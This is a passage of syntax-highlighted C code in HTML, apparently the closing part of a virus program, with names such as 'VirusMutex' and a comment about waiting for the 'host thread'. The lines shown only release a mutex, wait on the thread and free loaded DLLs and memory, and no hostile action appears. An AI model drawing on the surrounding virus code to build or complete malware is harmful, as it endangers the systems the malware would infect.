        </span><span class="sc11">ReleaseMutex</span><span class="sc10">(</span><span class="sc11">VirusMutex</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc10">}</span><span class="sc0">
      </span><span class="sc2">// Wait until host thread finnished
</span><span class="sc0">      </span><span class="sc11">WaitForSingleObject</span><span class="sc10">(</span><span class="sc11">HThread</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">INFINITE</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">ImportedDLLs</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc11">FreeLibrary</span><span class="sc10">(</span><span class="sc11">HandleDLL</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">HandleDLL</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
      </span><span class="sc11">MEMFREE</span><span class="sc10">(</span><span class="sc11">HandleDLL</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span></div></body>
</html>
